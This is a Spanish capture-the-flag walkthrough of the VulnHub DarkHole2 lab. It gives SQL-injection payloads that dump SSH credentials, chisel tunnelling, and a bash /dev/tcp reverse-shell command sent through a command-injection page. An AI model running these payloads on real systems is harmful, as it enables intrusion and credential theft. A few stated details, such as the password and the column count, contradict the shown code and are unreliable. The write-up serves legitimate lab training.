# VULNHUB PEN TESTING LABS
## MACHINE DARKHOLE2
> ![alt text](https://i.postimg.cc/8kvRdjsH/imagen.png))
---

### Sinopsis 
Darkhole2 es una máquina Linux fácil con una de vulnhub.
### Habilidades Aprendidas

> * Enumeración y escaneo.
>   * Puertos TCP y UDP.
> * SQL-Injection.
> * Configuración de proxy/pivote local.
> * Conexion remota con telnet.
> * Ganar acceso con shell reversa
> * Chisel
>   * Remot port forwarding
> * Elevación de privilegios con privilegios SUID
> * Fuzzing Directory, archivos git.


## Enumeración y Escaneo

Para iniciar la fase de reconocimiento, se utilizara la herramienta `arp-scan` para identificar la ip del equipo.

#### Enumeración de la red.
```ruby
sudo arp-scan -I ens33 --localnet
[sudo] password for s3cur1ty3c: 
Interface: ens33, type: EN10MB, MAC: 00:0c:29:19:36:86, IPv4: 192.168.200.139
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.200.2	00:50:56:f9:1b:b3	VMware, Inc.
192.168.200.1	00:50:56:c0:00:08	VMware, Inc.
192.168.200.140	00:0c:29:0e:6c:97	VMware, Inc.
192.168.200.254	00:50:56:fb:72:c5	VMware, Inc.
```
A continuación el significado de los parametros de arp-scan, ademas identificamos que el equio encontrado es el `192.168.200.140`

>* *-I*: Flag para establecer porque interface va salir el escaneo.
>* *ens33*: Nombre de la interface en la que se va ejecutar el escaneo.
>* *--localnet*: especifica que el escaneo se ejecute en la red interna.

Utilizamos el comonado ping para enviar una traza icmp

#### Validación de conectividad.
```ruby
ping -c 1 192.168.200.140
PING 192.168.200.140 (192.168.200.140) 56(84) bytes of data.
64 bytes from 192.168.200.140: icmp_seq=1 ttl=64 time=2.20 ms

--- 192.168.200.140 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2.199/2.199/2.199/0.000 ms
```
>*_Nota_*: el parametro *_-c_* de la traza icmp, permite enviar los paquetes asignados para la prueba, en el ejemplo anterior un solo paquete. Y como se pude interpretar, el ttl corresponde a una maquina linux.

### Escaneo y enumeración de servicios
Para la etapa de identificación de viulnerabilidades utilizamos la herramienta *_nmap_*, que servirá para verificar los servicioes y puertos expuestos.

#### Identicación de puertos y servicios con nmap. 65535 Puertos.
```bat
# nmap -p- --open -T5 -v -n -oG allPorts 192.168.200.140
# nmap  -p- --open -sS --min-rate 5000-vvv -n -Pn 192.168.200.140 -oG allPorts
```
A continuación el significado de los parametros de nmap.

>* *_-p-_*: Ejecuta la validación sobre todos los puertos 65535.
>* *_-T[0-5]_*: Corresponde a la plantilla del temporizado entre mas alto es el numero, el escaneo es mas rapido y mas ruidoso o intrusivo, el numero 5 es ideal para entornos controlados.
>* *_-v_*: Aumentar el nivel de mensajes detallados (use -vvv para aumentar el efecto).
>* *_-n_*: Le indica a Nmap que nunca debe realizar resolución DNS inversa de las direcciones IP activas que encuentre. Ya que DNS es generalmente lento, esto acelera un poco las cosas.
> * *_-Pn_*: Este parametro evita que se aplique resolución de host discovery, a travéz del protocolo arp.
> * *_-oG_*: -oN/-oX/-oS/-oG \<file>: Guardar el sondeo en formato normal, y Grepeable (para usar con grep) respectivamente, al archivo indicado.
> * *_sS_*: Análisis TCP SYN/Connect()/ACK.
> * *_--min-rate 5000_*: emite paquete no mas lentos a 5000 paquetes por segundo.
> * *_--open_*: muestra solo los puertos abiertos.

#### Resultado formato grepeable -oG

```python
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
File: allPorts
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
# Nmap 7.92 scan initiated Tue Dec 20 12:51:16 2022 as: nmap -p- --open -sS --min-rate 5000 -vvvv -n -Pn -oG allPorts 192.168.200.140
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 192.168.200.140 ()    Status: Up
Host: 192.168.200.140 ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///    Ignored State: closed (65533)
# Nmap done at Tue Dec 20 12:51:23 2022 -- 1 IP address (1 host up) scanned in 6.77 seconds
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Una vez escaneado se puede evidenciar que encontró abierto los puertos 22 y 80, para lo que se puede ejecutar un escaneo mejorado a nivel se scritps con nmap.

```python
sudo nmap -p22,80 -sCV 192.168.200.140 -oN targeted
```
A continuación el significado de los parametros de nmap.

>* *_-sC_*: Escanee conn scripts básicos de enumeración.
>* *_-sV_*: Detecta la version y servicio que corren para los puertos.
>* *_-p23_*: Que el escanee se ejecute sobre esos puertos.
>* *_-oN_*: Exporte en formato nmap.

```python
────────────────────────────────────────────────────────────────────────────────────────────────────────
File: targeted
────────────────────────────────────────────────────────────────────────────────────────────────────────
# Nmap 7.92 scan initiated Tue Dec 20 12:55:44 2022 as: nmap -p22,80 -sCV -oN targeted 192.168.200.140
Nmap scan report for 192.168.200.140
Host is up (0.0021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)
|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)
|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   192.168.200.140:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: i changed login.php file for more secure 
|_http-title: DarkHole V2
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
MAC Address: 00:0C:29:0E:6C:97 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 20 12:55:52 2022 -- 1 IP address (1 host up) scanned in 8.16 seconds
────────────────────────────────────────────────────────────────────────────────────────────────────────
```

En el escaneo anterio pudimos identificar que existe una carpeta `.git`, por lo que utilizaremos el comando `wget -r`, para descargar el contenido.

```ruby
wget -r http://192.168.200.140/.git/
ls
192.168.200.140
```
se pude apreciar que se ha descargado una carpeta con el nombre de ip de la maquina. Acontinuación ingresamos a al carpteta , y ejecutamos los sigueintes comandos de git:

```ruby
# git log --oneline
0f1d821 (HEAD -> master) i changed login.php file for more secure
a4d900a I added login.php file with default credentials
aa2a5f3 First Initialize
```

para ver el contido del login.php se puede visualizar con el comando `git show` y el nombre de la cabecera.

```ruby
# git show a4d900a

commit a4d900a8d85e8938d3601f3cef113ee293028e10
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:06:20 2021 +0300

    I added login.php file with default credentials

diff --git a/login.php b/login.php
index e69de29..8a0ff67 100644
--- a/login.php
+++ b/login.php
@@ -0,0 +1,42 @@
+<?php
+session_start();
+require 'config/config.php';
+if($_SERVER['REQUEST_METHOD'] == 'POST'){
+    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
+        $_SESSION['userid'] = 1;
+        header("location:dashboard.php");
+        die();
+    }
+
+}
+?>
```
Se puede verificar que el nombre de usuario es `lush@admin` y la contraseña `123`, estas credenciales son ingresar por el archivo login.php, una vez ingresadas la credenciales redireccionará al la ruta `http://192.168.200.140/dashboard.php?id=1`


## Burpsuite

Con la herramienta bursuite se puede ejecutar pruebas de inyección sql, por lo que, interceptaremos la peticion get on id para hacer ls pruebas y se debe enviar al repeater


> ![alt text](https://i.postimg.cc/dtSXP3Pg/imagen.png)

```ruby
GET /dashboard.php?id=1'+order+by+100--+- HTTP/1.1
GET /dashboard.php?id=1'+order+by+6--+- HTTP/1.1
```
**Nota:** Se debe ejecutar varias pruebas hasta que el resultado sea el correcto, en este caso se puede evidenciar que se reducen las columnas de 100 hasta llegar el numero de columns que son 5, tene una respuesta dede estado 200 del servidor, acontinuaciones se puede usar la parametro unio selecto para unir las 6 columnas

```python
GET /dashboard.php?id=2'union+select+1,2,3,4,5,6--+- HTTP/1.1
Host: 192.168.200.140
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=l66cr5745rherg4u1aafmqlaeh
Connection: close
```
**Nota:** A partir de eso los númeroes pueden ser reemplazados por consultas para hacer solicitar información de la base de datos. En este caso se puede reemplazar el numero 3 por `database()`, lo que nos permitira obtener la base de datos en uso.

```python
GET /dashboard.php?id=2'union+select+1,2,database(),4,5,6--+- HTTP/1.1
Host: 192.168.200.140
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=l66cr5745rherg4u1aafmqlaeh
Connection: close
```
En los resultados se podra observar el nombre de la base de datos, `darkhole_2`
> ![alt text](https://i.postimg.cc/85d1CWBy/imagen.png)

Junto a la instruccion anterior se puede acompañar de mas comandos para permitir, extraer mas detalles de las base de datos:

```python
GET /dashboard.php?id=2'union+select+1,2,group_concat(schema_name),4,5,6+from+information_schema.schemata--+- HTTP/1.1
Host: 192.168.200.140
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=l66cr5745rherg4u1aafmqlaeh
Connection: close
```
Enumernado las tablas de la base de datos, `darkhole_2`.
```python
GET /dashboard.php?id=2'union+select+1,2,group_concat(table_name),4,5,6+from+information_schema.tables+where+table_schema%3d'darkhole_2'--+- HTTP/1.1
Host: 192.168.200.140
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=l66cr5745rherg4u1aafmqlaeh
Connection: close
```

Enumerando los campos de la tabla ssh
```python
GET /dashboard.php?id=2'union+select+1,2,group_concat(column_name),4,5,6+from+information_schema.columns+where+table_schema%3d'darkhole_2'+and+table_name%3d'ssh'--+- HTTP/1.1
Host: 192.168.200.140
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=l66cr5745rherg4u1aafmqlaeh
Connection: close
```
Obteniendo las contraseñas y password de la tabla ssh
```python
GET /dashboard.php?id=2'union+select+1,2,group_concat(user,0x3a,pass),4,5,6+from+darkhole_2.ssh--+- HTTP/1.1
Host: 192.168.200.140
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=l66cr5745rherg4u1aafmqlaeh
Connection: close
```
Resultado obtenido 
> ![alt text](https://i.postimg.cc/zDk1yK4h/imagen.png)

## Accediendo por ssh
con las credenciales obtenidas el siguiente proceso es de ingresar por ssh. `ssh jehad@192.168.200.140`, verificamos el acceso con el comando `whoami`.

```ruby
jehad@darkhole:~$ whoami
jehad
```
Una vez a dentro se puede enumerar servicios haciendo uso de netstat o ps, por lo que, en el siguiente cuadro identificaremos una servicio web, en el puerto 9999.

```ruby
jehad@darkhole:~$ netstat -putona
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 192.168.200.140:22      192.168.200.139:46094   ESTABLISHED -                    keepalive (7032.81/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      -                    off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      -                    off (0.00/0/0)
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                    off (0.00/0/0)
udp        0      0 192.168.200.140:68      0.0.0.0:*                           -                    off (0.00/0/0)
jehad@darkhole:~$ ps -faux | grep 9999
losy        1237  0.0  0.0   2608   536 ?        Ss   16:22   0:00      \_ /bin/sh -c  cd /opt/web && php -S localhost:9999
losy        1245  0.0  0.4 193672 18984 ?        S    16:22   0:01          \_ php -S localhost:9999
jehad     146417  0.0  0.0   8160   724 pts/0    S+   21:53   0:00              \_ grep --color=auto 9999
jehad@darkhole:~$ 
```

En el cuadro anterio se puede evidenciar que el servico web esta levando por un servidor php, y se ejecuta con el usuario propietario losy. El objetiv es taratr de ver que esta corriendo en el archivo index.php.

```ruby
jehad@darkhole:/opt/web$ 
jehad@darkhole:/opt/web$ 
jehad@darkhole:/opt/web$ ls 
index.html  index.php
jehad@darkhole:/opt/web$ 
jehad@darkhole:/opt/web$ cat index.php 
<?php
echo "Parameter GET['cmd']";
if(isset($_GET['cmd'])){
echo system($_GET['cmd']);
}
?>
```
Se puede indentificar que existe inyección de comandos mediante el archivo index.php, por lo que se puede utilizar [chisel](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz) para hacer remotporforwarding, y utilizar la vulnerabilidad.

>```python
>wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
>gunzip chisel_1.7.7_linux_amd64.gz
>mv chisel_1.7.7_linux_amd64 chisel
>chmod +x chisel
>```

#### Creación servidor web
Con el archivo comprimido, y para compartir el archivo con equipo victima se puede usar un servidor web con python3.
>```bash
> sudo python3 -m http.server 80
>```
Desde el servidor web utilizamos la herramienta wget 
#### Descarga de chisel desde un server web
```ruby
jehad@darkhole:/opt/web$ wget http://192.168.200.139:80/chisel
--2022-12-22 02:26:21--  http://192.168.200.139/chisel
Connecting to 192.168.200.139:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8077312 (7.7M) [application/octet-stream]
Saving to: ‘chisel’

chisel                                          100%[=======================================================================================================>]   7.70M  --.-KB/s    in 0.1s    

2022-12-22 02:26:22 (71.4 MB/s) - ‘chisel’ saved [8077312/8077312]

jehad@darkhole:/opt/web$ ls
chisel  index.html  index.php
jehad@darkhole:/opt/web$ 

```
### Port Forwarding
Para crear el port forwarding, ejecutar el desde el equipo atacante que funcionara como server el siguiente comando:

##### Maquina local o server
```ruby
./chisel server --reverse -p 1104
2022/12/21 21:35:51 server: Reverse tunnelling enabled
2022/12/21 21:35:51 server: Fingerprint i2CESBQlfHqh+VrwDA/hR/wZqi8qQLA9dM4uu8gltx4=
2022/12/21 21:35:51 server: Listening on http://0.0.0.0:1104
```
##### Maquina victima "darkhole" o cliente
```ruby
jehad@darkhole:/opt/web$ chmod +x chisel 
jehad@darkhole:/opt/web$ ./chisel client 192.168.200.139:1104 R:9999:127.0.0.1:9999
2022/12/22 02:41:28 client: Connecting to ws://192.168.200.139:1104
2022/12/22 02:41:28 client: Connected (Latency 59.800043ms)
```
Para validar que el proceso de remotPortForwarding, desde el explorador ingresamos por el servidor local.

![alt text](https://i.postimg.cc/x8XS2rFy/imagen.png)

Levantar una conexion reversa con netcat, para ejecutar una conexion reversa.
```ruby
sudo nc -nlvp 443
[sudo] password for s3cur1ty3c: 
listening on [any] 443 ...
```

En la imagen anterior se puede observar que el servidor permite la ejecución de codigo remoto, por lo se puede utilizar para la ejecutar una shell reversa.
```ruby
http://192.168.200.139:9999/?cmd=bash -c "bash -i %26>/dev/tcp/192.168.200.139/443  0>%261"
```
El porcentaje `%26 -->&`, se utiliza para urlencodear el caracter `&`, como resultado obtendremos al shell reversa.

```ruby
sudo nc -nlvp 443
[sudo] password for s3cur1ty3c: 
listening on [any] 443 ...
connect to [192.168.200.139] from (UNKNOWN) [192.168.200.140] 40520
bash: cannot set terminal process group (1237): Inappropriate ioctl for device
bash: no job control in this shell
losy@darkhole:/opt/web$ 
```
Podemos ingresar a la carpeta home del usuario losy para observar, la flag user.txt.
```ruby
losy@darkhole:/opt/web$ cd ~
losy@darkhole:~$ ls
ls
user.txt
losy@darkhole:~$ cat user.txt   
cat user.txt
DarkHole{'This_is_the_life_man_better_than_a_cruise'}
losy@darkhole:~$ 
```
Podemos observar el historial de bash, donde identificamos la contraseña del usuario losy.
```ruby
cat .bash_history 
clear
password:gang 
```
Podemos observar que el binario de python3, tiene permisos de execución por lo que lo puede utilizar para elevar privilegios.
```ruby
losy@darkhole:~$ sudo -l -S
sudo -l -S
[sudo] password for losy: gang
Matching Defaults entries for losy on darkhole:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User losy may run the following commands on darkhole:
    (root) /usr/bin/python3
losy@darkhole:~$ 
```

















